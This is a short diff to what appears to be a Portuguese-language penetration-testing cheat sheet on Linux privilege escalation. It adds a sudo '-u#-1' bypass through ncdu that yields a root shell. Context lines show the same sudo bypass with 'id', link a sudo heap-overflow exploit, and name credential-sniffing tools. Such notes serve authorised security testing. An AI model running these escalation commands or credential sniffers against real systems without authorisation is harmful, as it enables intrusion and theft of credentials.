@@ -64,6 +64,11 @@ https://github.com/blasty/CVE-2021-3156
 # Miss configuration pra root
 sudo -u#-1 id
 
+# Caso o (ALL, !root) /bin/ncdu pode escalar assim:
+sudo -u#-1 /bin/ncdu
+b
+id
+
 # Se o alvo tiver tcpdump
 https://github.com/DanMcInerney/net-creds
 https://github.com/lgandx/PCredz
